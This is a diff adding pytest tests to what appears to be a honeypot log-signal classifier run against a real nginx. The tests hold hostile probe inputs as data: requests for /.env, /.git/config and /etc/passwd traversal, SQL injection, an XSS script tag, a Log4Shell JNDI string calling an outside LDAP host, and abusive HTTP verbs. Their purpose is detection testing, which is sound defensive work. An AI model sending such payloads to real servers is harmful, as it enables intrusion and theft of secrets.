@@ -28,7 +28,7 @@ from pathlib import Path
 import pytest
 
 import nginx_emu
-from lurewall import accesslog, canaries, labsite, signing
+from lurewall import accesslog, canaries, labsite, sigconfig, signals, signing
 from lurewall.eventlog import EventLog
 from lurewall.logreader import LogReader
 from lurewall.verify import verify_log
@@ -416,3 +416,102 @@ def test_hostile_bytes_are_logged_and_every_line_is_accounted_for(lab, tmp_path)
     assert all(record.ip == "127.0.0.1" for record in records)  # no text moved a request
     assert by_uri["/h11"].ua == "A" * 4000
     assert any(record.status == 400 for record in records)
+
+
+# -- signals, against what a real nginx logs ------------------------------------------
+
+
+def _classifier(lab):
+    config = sigconfig.load(REPO / "deploy" / "signals" / "lab-site.toml")
+    return signals.Classifier(config, lab.canary_set, labsite.site_routes())
+
+
+def _request(
+    lab, method: bytes, target: bytes, extra: bytes = b""
+) -> tuple[bytes, accesslog.Record]:
+    ua = f"lurewall-signal-{uuid.uuid4().hex}"
+    response = lab.raw(
+        method + b" " + target + b" HTTP/1.1\r\nHost: lab\r\nUser-Agent: " + ua.encode()
+        + b"\r\n" + extra + b"Connection: close\r\n\r\n"
+    )  # fmt: skip
+    return response, lab.record_for(ua)
+
+
+@pytest.mark.parametrize(
+    ("target", "key"),
+    [
+        (b"/.env", "path:*/.env"),
+        (b"/%2eenv", "path:*/.env"),
+        (b"/%2Eenv", "path:*/.env"),
+        (b"//.env", "path:*/.env"),
+        (b"/.ENV", "path:*/.env"),
+        (b"/x/../.env", "path:*/.env"),
+        (b"/.git/config", "path:*/.git"),
+        (b"/%2egit//CONFIG", "path:*/.git"),
+        (b"/Admin/", "path:/admin"),
+        (b"//a%64min", "path:/admin"),
+        (b"/WP-Login.php", "path:/wp-login.php"),
+        (b"/?id=1'%20OR%201=1", "injection:sqli"),
+        (b"/?f=..%2f..%2fetc%2fpasswd", "injection:traversal"),
+        (b"/?q=%3Cscript%3Ealert(1)%3C/script%3E", "injection:xss"),
+        (b"/?x=${jndi:ldap://203.0.113.9/a}", "injection:jndi"),
+    ],
+)
+def test_path_and_injection_variants_as_a_real_nginx_logs_them(lab, target, key):
+    response, record = _request(lab, b"GET", target)
+    assert response.startswith(b"HTTP/1.1 ")
+    # nginx logs the URI as the client sent it, so both forms can be matched.
+    assert record.uri == target.decode()
+    result = _classifier(lab).classify(record)
+    assert key in [signal.key for signal in result.attack]
+    assert result.canary is None
+
+
+@pytest.mark.parametrize("method", [b"PUT", b"DELETE", b"TRACE", b"PROPFIND"])
+def test_verb_abuse_as_a_real_nginx_logs_it(lab, method):
+    response, record = _request(lab, method, b"/index.html", b"Content-Length: 0\r\n")
+    assert response.split(b" ", 2)[1] in (b"405", b"403", b"400")
+    assert record.method == method.decode()
+    assert [signal.key for signal in _classifier(lab).classify(record).attack] == ["method"]
+
+
+def test_real_pages_assets_and_decoys_raise_no_attack_signal_on_a_real_nginx(lab):
+    classifier = _classifier(lab)
+    for target in (b"/", b"/docs/", b"/assets/site.css", b"/robots.txt", b"/no-such-page.html"):
+        _response, record = _request(lab, b"GET", target)
+        assert classifier.classify(record).attack == (), target
+    _response, asset = _request(
+        lab, b"GET", b"/assets/site.css", b"Sec-Fetch-Site: same-origin\r\n"
+    )
+    result = classifier.classify(asset)
+    assert result.asset and result.browser_metadata
+    for canary in lab.canary_set.canaries:
+        response, record = _request(lab, b"GET", canary.reference("0f" * 16).encode())
+        assert response.startswith(b"HTTP/1.1 200")
+        result = classifier.classify(record)
+        assert result.attack == ()
+        assert result.counted_canary is not None and result.counted_canary.canary.id == canary.id
+
+
+def test_a_decoy_reached_through_an_attack_spelling_is_what_nginx_serves(lab):
+    # The classifier says this is a decoy request, not a /admin probe. Check
+    # that nginx agrees: it resolves the path and answers with the decoy body.
+    canary = lab.canary_set.canaries[0]
+    response, record = _request(lab, b"GET", b"/admin/.." + canary.path.encode())
+    assert response.startswith(b"HTTP/1.1 200")
+    assert response.endswith(canary.body.encode())
+    result = _classifier(lab).classify(record)
+    assert result.canary is not None
+    assert [signal.key for signal in result.attack] == ["injection:traversal"]
+
+
+def test_cross_site_headers_as_a_real_nginx_logs_them(lab):
+    classifier = _classifier(lab)
+    for extra, reason in (
+        (b"Sec-Fetch-Site: cross-site\r\n", "sec_fetch_site"),
+        (b"Referer: https://evil.example/frame.html\r\n", "referer"),
+    ):
+        _response, record = _request(lab, b"GET", b"/.env", extra)
+        result = classifier.classify(record)
+        assert result.cross_site == reason
+        assert result.attack == ()
